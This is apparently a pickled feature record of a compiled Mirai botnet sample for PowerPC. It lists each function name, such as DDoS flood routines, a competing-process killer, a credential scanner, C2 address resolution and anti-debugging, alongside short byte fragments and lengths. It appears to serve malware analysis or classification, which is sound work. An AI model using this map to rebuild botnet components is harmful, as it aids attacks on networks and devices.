(lp0
(S'_init'
p1
S'9421e008a690012400c94800e938007c03'
p2
L36L
tp3
a(S'__do_global_dtors_aux'
p4
S'9421'
p5
L148L
tp6
a(S'call___do_global_dtors_aux'
p7
S'7c0290011401142110a64e80'
p8
L28L
tp9
a(S'frame_dummy'
p10
S'3d08a639009421'
p11
L108L
tp12
a(S'call_frame_dummy'
p13
S'7c0290011401142110a64e80'
p14
L28L
tp15
a(S'_start'
p16
S'7c0b213dad5428000003800468103800e7f83c10384448'
p17
L72L
tp18
a(S'attack_app_http'
p19
S'9421a67d0093a12bc1a0517c9623817c337778c07feb900191813a518461518cc1e15c920192219241516892a151801a9061514438'
p20
L6936L
tp21
a(S'attack_get_opt_str'
p22
S'7c1bc33309a64c810424082840be008800290828419e007d4b7800ec4e808080'
p23
L72L
tp24
a(S'attack_get_opt_ip'
p25
S'9421'
p26
L68L
tp27
a(S'attack_get_opt_int'
p28
S'9421'
p29
L72L
tp30
a(S'attack_start'
p31
S'7c029341007d43786100fb3b8178a12bc17c23e11c7f780124002f83419e0083409d0001244100837c03831821200048002f83419e002f83409e007ffb780029804800380096b120028040bd107c033900090480419e003901ff5569880080409e'
p32
L276L
tp33
a(S'attack_parse'
p34
S'7d002ba69421c023e13c7f788114c192e11c01204100936100813401449181108404230000000081a6'
p35
L660L
tp36
a(S'attack_kill_all'
p37
S'9421e008a63de11ce900a0003b009001240014bf009f0000803800419eff4800bf009f00ff48008024a1007c0338004e80'
p38
L128L
tp39
a(S'add_attack'
p40
S'9421d0a69321149923410038007c1b8038016100601093a18b88787b5054843a84043d8d907b50380055293a19981c4c8034211441007c038324213000'
p41
L152L
tp42
a(S'attack_init'
p43
S'7c023c10380084900114'
p44
L192L
tp45
a(S'attack_gre_eth'
p46
S'9421907c029321547c2380900174812841007c1b6100814492e14c930150934100610000dc78a12bc193e16c920130c14800788478a0007feb4b'
p47
L1472L
tp48
a(S'attack_gre_ip'
p49
S'9421907c029341009a900174812801307378814492e14c93015093215493610000dc78a12bc193e16c922134410092c148007fe338007feb4bfff1380060'
p50
L1364L
tp51
a(S'attack_tcp_stomp'
p52
S'9421607c02928178809001a491815891e15c9201609221924101a11bc192e17c018001dc78a12be19c9261010148007c1b807eab78007fe338007c1ba3ee8dc0546360'
p53
L1608L
tp54
a(S'attack_tcp_ack'
p55
S'94217008a67d0093217499238090019491814891e14c920150922154924100610000a11bc192e16c930170410061000093a12bc193e18c787c1b8478a0007feb4b'
p56
L1508L
tp57
a(S'attack_tcp_syn'
p58
S'9421807d009361002380900184c191e13c0140922144924100610000a100e15c9301607c1b219341008178a12bc193e17c007c1b8478a0007feb4bff71c0546360'
p59
L1444L
tp60
a(S'attack_udp_plain'
p61
S'9421b008a67d0092e12c972380900154918124c193013041007c1b61008178a12bc193e14c3b00926100'
p62
L696L
tp63
a(S'attack_udp_generic'
p64
S'9421907c0293c17c2380900174812c0130a1007678e14c930150932154934100610000dc78a12be16c91c192410092610081b177788478a30038004b'
p65
L1104L
tp66
a(S'attack_udp_vse'
p67
S'9421a07d009361002380900191812ca10092e13c777801409321449341008178a12bc193e15c91e11c0120410092817c1b8478a30038004bffc9380060'
p68
L992L
tp69
a(S'attack_udp_dns'
p70
S'94217008a67d0091c17c238090019491814c7c1b015092610808e16c9301702174410861080893a12be18c4108a108c148007c1b8478a0007feb4bffe5c0546360'
p71
L1648L
tp72
a(S'checksum_generic'
p73
S'2b000024'
p74
L100L
tp75
a(S'checksum_tcpudp'
p76
S'2f8601e3100039002f8900f87e290103a0'
p77
L184L
tp78
a(S'mem_exists'
p79
S'7f203800a6419d0040007d2888007f580048000039006301ff380000409a4e80'
p80
L80L
tp81
a(S'killer_kill'
p82
S'7c023d8090011469c52110a64e80'
p83
L44L
tp84
a(S'killer_kill_by_port'
p85
S'9421a03810936122029301403b1293a11b6378019321443b0093c13b0093e15c3b0092e13c412281dd8038c3780038027f780038cb78a30093e10ce110007fcb78002f83419e05063b0048006d3807480038093b601038b4804c'
p86
L1520L
tp87
a(S'killer_init'
p88
S'7c023800011401d041209261209281e4c192e1ec9301'
p89
L1684L
tp90
a(S'anti_gdb_entry'
p91
S'3d6010396bd44e80'
p92
L20L
tp93
a(S'teardown_connection'
p94
S'7c0293e10ce0027f2c83419e00480038'
p95
L72L
tp96
a(S'ensure_single_instance'
p97
S'7c0238003802014438009381008093e13ce002c19001084a3983380038008038d4419e008303a0eb4c'
p98
L492L
tp99
a(S'main'
p100
S'7c029301607c1b0184a10093410668920140922144924106489261064c92815492c192e15c93219361066c938178e17c008148ddeb384885a0eb38003d01600048003c1038053c1038c4804c'
p101
L2280L
tp102
a(S'resolve_cnc_addr'
p103
S'7c02380301248114003803237c1b60004800419e009f0000757f0078a05b963bfb78007d485055293a901d02380400e9382338041d238024811408a6831c212000'
p104
L188L
tp105
a(S'rand_next'
p106
S'3c103c108102e0026cfe6058284a78637808f87c4a78637c4a7806d49148d491d490d54e80'
p107
L80L
tp108
a(S'rand_str'
p109
S'9421'
p110
L148L
tp111
a(S'rand_alphastr'
p112
S'9421b008a63800238093c13878610093a100376d2f9f00409d006300409d00'
p113
L204L
tp114
a(S'rand_init'
p115
S'7c02380080900124a1339069d97800191abc5d803d60108378a1d58024212008a64e80'
p116
L112L
tp117
a(S'resolv_skip_name'
p118
S'380039000300002f80540b2b00409900003901007d4a1429'
p119
L136L
tp120
a(S'resolv_entries_free'
p121
S'9421'
p122
L68L
tp123
a(S'resolv_domain_to_hostname'
p124
S'9421e008a693a11b8393e11c01249f2300786301bd00380140007c03480068552a3901ff015b787d01001f002f802f0000002a01ff9948007feb3900ff3800981d00a10008a638004e8038007c03'
p125
L184L
tp126
a(S'resolv_lookup'
p127
S'942120a67d0038107c1b60009181e4611081a8a10092c13a0092e1bc9321c421b441109361103b01c093e1dc1e'
p128
L1004L
tp129
a(S'consume_any_prompt'
p130
S'9421'
p131
L188L
tp132
a(S'can_consume'
p133
S'8018631ca5226314631010d000'
p134
L32L
tp135
a(S'scanner_kill'
p136
S'7c023d8090011469bd38007c03'
p137
L44L
tp138
a(S'deobf'
p139
S'7c029381780124a123e11c00797d00630138bde37c1ba5004800d5bd00409d007f037cf8ae6809ae390042008024e378811408a6831c212000'
p140
L140L
tp141
a(S'add_auth_entry'
p142
S'9421c0936100601081003f401055299381787a687c238910e11ce1082124b90000717878e478838368812081780108207d5a147898090cc3b383687f02'
p143
L296L
tp144
a(S'setup_connection'
p145
S'7c0293e12c7f780134a1008093a1'
p146
L236L
tp147
a(S'recv_strip_null'
p148
S'7c0293e10c9f23011400750300007c0339417cf8ae2f80409e007df9ae39004200ec8014e10c2110a64e80'
p149
L88L
tp150
a(S'scanner_init'
p151
S'7c0291c191e13c0140922144924107489261074c92815492c192e15c930160932193410768938174c193e17c01842500695c8084e13c08a6'
p152
L5988L
tp153
a(S'table_retrieve_val'
p154
S'2c003d633829547d4a14'
p155
L40L
tp156
a(S'toggle_obf'
p157
S'3d633829547c4a14200280803405065407'
p158
L140L
tp159
a(S'add_entry'
p160
S'9421e008a69361009b238178a11ba300410048007885787a7800021839d580247d145d49b30008a683838314212000'
p161
L120L
tp162
a(S'table_init'
p163
S'7c023c10380384503800e10c'
p164
L1032L
tp165
a(S'util_strlen'
p166
S'88007c1b60002f804d9e003801ae2f80409eff4e80'
p167
L40L
tp168
a(S'util_strncmp'
p169
S'7c02938178a1007c1be11c9f230124'
p170
L180L
tp171
a(S'util_strcmp'
p172
S'7c0293a1007c1be11c9f230124'
p173
L160L
tp174
a(S'util_memcpy'
p175
S'7c2b09a64d'
p176
L36L
tp177
a(S'util_strcpy'
p178
S'9421e008a69361007b788390012481149d23'
p179
L92L
tp180
a(S'util_zero'
p181
S'7c2309a64d'
p182
L36L
tp183
a(S'util_itoa'
p184
S'9421c093e13cbf00002f0300003800987f0101447ffb78e13c21407c032f840a00009e0040007c2339'
p185
L236L
tp186
a(S'util_memsearch'
p187
S'7f207c1b9d0060'
p188
L92L
tp189
a(S'util_stristr'
p190
S'9421e008a693a123c17c1ba3000124bffc719d003b1b40007f78a9008900630150ae39010bbf54002b'
p191
L232L
tp192
a(S'util_atoi'
p193
S'89003801067d4b78802f0009'
p194
L312L
tp195
a(S'util_fdgets'
p196
S'7c029361007b7801248178a12bc13b0093e11c7f78e478a300480078833b00409e00de01000088002f80409eff7f'
p197
L164L
tp198
a(S'util_local_addr'
p199
S'7c0293c13b00013400100108093800380038004800593d837c1b2908a0780000003800912110003548002178a1fb7800457ffb78003d7c030134c1832c08a638004e80'
p200
L172L
tp201
a(S'ioctl'
p202
S'7c029421d0747f5000780134013801100003ab2b01089e005040419d0080800000203c80006c80409e0000287800cd000c8048005d7c1b004038ff38'
p203
L232L
tp204
a(S'fcntl'
p205
S'7c02390093e12c013404f42b00211000379121102003a100'
p206
L132L
tp207
a(S'fcntl64'
p208
S'7c0293e12c013401380110000300cc90a1007c0074107c1ba2078560'
p209
L100L
tp210
a(S'chdir'
p211
S'7c0293e10c0114000c000274107c1ba2073d38ffe10c2110a64e80'
p212
L72L
tp213
a(S'close'
p214
S'7c0293e10c0114000644000274107c1ba206f593e30060'
p215
L72L
tp216
a(S'fork'
p217
S'7c0293e10c011400020274107c1ba206ad93e30060'
p218
L72L
tp219
a(S'getpid'
p220
S'7c0293e10c01140014000274107c1ba20693e30060'
p221
L72L
tp222
a(S'getppid'
p223
S'7c0293e10c0114004044000274107c1ba2061d38ffe10c2110a64e80'
p224
L72L
tp225
a(S'kill'
p226
S'7c0293e10c011400257c0074107c1ba2050060'
p227
L72L
tp228
a(S'open'
p229
S'7c02390093e12c01348090a100390091210c21102003a94b78000274107c1ba2050060'
p230
L120L
tp231
a(S'creat'
p232
S'7c23804c'
p233
L16L
tp234
a(S'prctl'
p235
S'7c0293e10c011400ab44000274107c1ba2050060'
p236
L72L
tp237
a(S'read'
p238
S'7c0293e10c011400030274107c1ba20493e30060'
p239
L72L
tp240
a(S'readlink'
p241
S'7c0293e10c0114005544000274107c1ba20493e30060'
p242
L72L
tp243
a(S'select'
p244
S'7c0293e10c0114008e0274107c1ba20493e30060'
p245
L72L
tp246
a(S'setsid'
p247
S'7c0293e10c0114004244000274107c1ba20393e30060'
p248
L72L
tp249
a(S'sigprocmask'
p250
S'2c007c027c1bc02b0000ae93e10c'
p251
L120L
tp252
a(S'time'
p253
S'7c0293e10c0114000d7c0074107c1ba20338ffe10c2110a64e80'
p254
L72L
tp255
a(S'unlink'
p256
S'7c0293e10c0114000a0274107c1ba20293e30060'
p257
L72L
tp258
a(S'write'
p259
S'7c0293e10c01140004000274107c1ba20238ffe10c2110a64e80'
p260
L72L
tp261
a(S'closedir'
p262
S'7c023c10bf7f780134a3003800eb7f788040be0239'
p263
L164L
tp264
a(S'opendir'
p265
S'7c023800e000'
p266
L272L
tp267
a(S'readdir'
p268
S'9421d0a63c10bfa31b8408eb900134007feb480080043f007f00bd00801400010041a10048003c00001f003f007f0ca9007c021f001d007c582f80419eff8048007febbb08a638004e80'
p269
L192L
tp270
a(S'__errno_location'
p271
S'3c1038a0'
p272
L12L
tp273
a(S'clock'
p274
S'9421e008a6380800807c02012463102120a654637e80'
p275
L56L
tp276
a(S'memcpy'
p277
S'54a9'
p278
L156L
tp279
a(S'memmove'
p280
S'7f18682bbcffe814432a'
p281
L164L
tp282
a(S'memset'
p283
S'54a92363fc514a44514a80'
p284
L144L
tp285
a(S'tcgetattr'
p286
S'9421c0bf9f2380a1749001444c'
p287
L156L
tp288
a(S'tcsetattr'
p289
S'2f8401a69421b041007c1b01547c2b9e002f8402002f8400c0419e00480010c0480020fd09803800900300003fc08000a0009f008118410089008034df38210c6100914100012bc14b'
p290
L356L
tp291
a(S'inet_addr'
p292
S'9421e008a6380000a52f8338ff008080242120a64e80'
p293
L52L
tp294
a(S'accept'
p295
S'9421e008a690610038053800a11380242120a64e80'
p296
L52L
tp297
a(S'bind'
p298
S'9421e008a690610038028124a11280242120a64e80'
p299
L52L
tp300
a(S'connect'
p301
S'9421e008a690610038038124a11280242120a64e80'
p302
L52L
tp303
a(S'getsockname'
p304
S'9421e008a69061003806908108a11238007c03'
p305
L52L
tp306
a(S'getsockopt'
p307
S'9421d0a6906100389000900134a100e1181201342130a64e80'
p308
L60L
tp309
a(S'listen'
p310
S'9421e008a69061003804810800292120a64e80'
p311
L48L
tp312
a(S'recv'
p313
S'9421e008a6906100380a8124a10000f180242120a64e80'
p314
L56L
tp315
a(S'recvfrom'
p316
S'9421d0a6906100380c8108a100e11800b101342130a64e80'
p317
L64L
tp318
a(S'send'
p319
S'9421e008a690610038098124a100007901242120a64e80'
p320
L56L
tp321
a(S'sendto'
p322
S'9421d0a6906100380b8134a100e11800392130a64e80'
p323
L64L
tp324
a(S'setsockopt'
p325
S'9421d0a6906100380e908108a100e1181080342130a64e80'
p326
L60L
tp327
a(S'socket'
p328
S'9421e008a690610038018124a11080242120a64e80'
p329
L52L
tp330
a(S'raise'
p331
S'7c02bf7d780124ff7d0124a4ebbb2120a64bfff4'
p332
L48L
tp333
a(S'sigaddset'
p334
S'7c02900114802f80408118f8d1001639'
p335
L76L
tp336
a(S'sigemptyset'
p337
S'7c0238004b'
p338
L44L
tp339
a(S'signal'
p340
S'2f84'
p341
L224L
tp342
a(S'__sigismember'
p343
S'38fa5484'
p344
L40L
tp345
a(S'__sigaddset'
p346
S'3801fa5484'
p347
L40L
tp348
a(S'__sigdelset'
p349
S'38'
p350
L40L
tp351
a(S'malloc'
p352
S'2c007c02bf0134a20038'
p353
L344L
tp354
a(S'calloc'
p355
S'2f837c02bfe4d69001149e001f1b7f0041bef59938000300007ffb78'
p356
L112L
tp357
a(S'free'
p358
S'2c007c02bf0124'
p359
L256L
tp360
a(S'realloc'
p361
S'2c007c02bf7c780124a2'
p362
L304L
tp363
a(S'__heap_alloc'
p364
S'8103002b00390c230000007f584041bc008a40409c00690000090809088800007d53780804001853780300000b90090048509100380c808100409eff80'
p365
L160L
tp366
a(S'__heap_alloc_at'
p367
S'817805007d58503900894041bd2040be007f289c0005009c008100419e000b084b008100419e002a0480912800007c18a3004e808100ff4e80'
p368
L156L
tp369
a(S'__heap_link_free_area'
p370
S'2f8500a400419e008504000886000090860800'
p371
L44L
tp372
a(S'__heap_link_free_area_after'
p373
S'2c0041'
p374
L28L
tp375
a(S'__heap_free'
p376
S'7c027c1b6000bf0124e30014001000eb78ff049f0038000040409e'
p377
L300L
tp378
a(S'atol'
p379
S'38004800'
p380
L12L
tp381
a(S'strtol'
p382
S'38004800'
p383
L8L
tp384
a(S'_stdlib_strto_l'
p385
S'7c023d211499230134be337f7849d4480008ff0169700040'
p386
L436L
tp387
a(S'exit'
p388
S'9421d0a63c10bfa0d33b0038787f78c378013400c5eb4800b5200280419e007ffb7809a64e80c378804800954800f53d29008900004bff7ffb7800'
p389
L132L
tp390
a(S'sleep'
p391
S'7c1b08a6942140bf01c4013920a6380039000091490039ff107d3a00'
p392
L468L
tp393
a(S'__uClibc_fini'
p394
S'3d20020239d27d585093e10c7f700114001829c87c032f9f003b'
p395
L148L
tp396
a(S'__pthread_return_0'
p397
S'380000'
p398
L8L
tp399
a(S'__check_one_fd'
p400
S'9421'
p401
L96L
tp402
a(S'__uClibc_init'
p403
S'7c023d200029000114090080409e00003d0b9c3810900990419a3d29008900008014e10c2110a64bff8014e10c2110a64e80'
p404
L128L
tp405
a(S'__uClibc_main'
p406
S'7c023d21947c2b01b4807c022b884500a010915dd49109987c237978dc781e007c3b8a000090bd003800'
p407
L620L
tp408
a(S'__socketcall'
p409
S'7c0293e10c01140044000274107c1ba2e80060'
p410
L72L
tp411
a(S'_exit'
p412
S'7c02bf7e780114000178000274107c1b'
p413
L60L
tp414
a(S'fstat'
p415
S'9421907c023b0023006c7feb44000274103b1b'
p416
L116L
tp417
a(S'__getdents'
p418
S'7c02bf9f230124007d7e7981140044810cbf00901f007f00bf'
p419
L144L
tp420
a(S'__getdents64'
p421
S'7c0281000500be00d078216e7c23b77876780117541b38007fdb000274107c1b'
p422
L344L
tp423
a(S'getegid'
p424
S'7c0293e10c011400320274107c1ba2e593e30060'
p425
L72L
tp426
a(S'geteuid'
p427
S'7c0293e10c011400310274107c1ba2e593e30060'
p428
L72L
tp429
a(S'getgid'
p430
S'7c0293e10c0114002f44000274107c1ba2e493e30060'
p431
L72L
tp432
a(S'getuid'
p433
S'7c0293e10c011400180274107c1ba2e493e30060'
p434
L72L
tp435
a(S'lseek64'
p436
S'7c027c'
p437
L128L
tp438
a(S'nanosleep'
p439
S'7c0293e10c011400a27c0074107c1ba2e393e30060'
p440
L72L
tp441
a(S'sbrk'
p442
S'7c02bfe0027e78600080b48040be0500009e0080b41f036014be0500003b'
p443
L112L
tp444
a(S'times'
p445
S'7c0293e10c0114002b0274107c1ba2e393e30060'
p446
L72L
tp447
a(S'__xstat64_conv'
p448
S'9421e008a638007c237c78807feb900124ff4981043d003c083d001c101c141d00901d001d0081915d003c303d001c383c4081915d00001d001d001d008120a64e80'
p449
L204L
tp450
a(S'__xstat_conv'
p451
S'9421e008a638007c237c78807feb900124ff7d1c0020003d001d00901d001d00901d001d00913d001c1c1d00901d001d00901d00901d00901d008120a64e80'
p452
L176L
tp453
a(S'mempcpy'
p454
S'7c02bf7c780124bde180247c1481a638004e80'
p455
L52L
tp456
a(S'inet_aton'
p457
S'2c0041'
p458
L192L
tp459
a(S'sigaction'
p460
S'9421c03900bf9f23be1b0144380041'
p461
L196L
tp462
a(S'_dl_aux_init'
p463
S'801c2002200209b080'
p464
L28L
tp465
a(S'brk'
p466
S'9421'
p467
L52L
tp468
a(S'__syscall_rt_sigaction'
p469
S'7c0293e10c011400ad44000274107c1ba2dd93e30060'
p470
L72L
tp471
a(S'__syscall_error'
p472
S'7c02bf7d780124'
p473
L52L
tp474
a(S'__do_global_ctors_aux'
p475
S'7c023d29cc93e10c0114e9'
p476
L80L
tp477
a(S'call___do_global_ctors_aux'
p478
S'7c0290011401142110a64e80'
p479
L28L
tp480
a(S'_fini'
p481
S'9421e008a6900124'
p482
L32L
tp483
a.